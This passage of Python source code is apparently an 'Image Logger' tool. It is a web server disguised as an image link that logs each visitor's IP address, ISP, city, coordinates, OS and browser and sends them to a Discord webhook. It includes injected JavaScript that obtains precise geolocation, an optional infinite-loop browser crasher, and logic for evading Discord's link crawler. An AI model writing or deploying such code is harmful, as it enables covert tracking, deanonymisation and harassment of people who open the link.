    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
